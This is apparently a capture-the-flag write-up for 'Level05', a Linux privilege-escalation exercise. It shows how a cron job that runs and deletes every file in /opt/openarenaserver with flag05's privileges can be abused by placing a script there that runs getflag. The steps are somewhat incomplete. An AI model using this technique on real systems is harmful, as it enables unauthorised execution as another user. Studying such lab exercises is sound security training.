## **Level05 - Solution**

When connecting to level 05, the message "You have new mail" appears on the standard output. Upon further investigation, we find a directory `/rofs/var/mail` which contains a file named `level05`. This file corresponds to a cron job:

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This job runs the mentioned script every 2 minutes with `flag05`'s privileges. The script looks like this:

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
  (ulimit -t 5; bash -x "$i")
  rm -f "$i"
done
```

It executes and deletes all the files contained in the specified directory. Therefore, we can have `flag05` execute a file by placing it in that directory. For example, use the following commands:

```bash
getflag > /tmp/flag.txt
chmod +x script.sh
```

After 2 minutes, we can check the directory, and the file will contain the result of the `getflag` command.
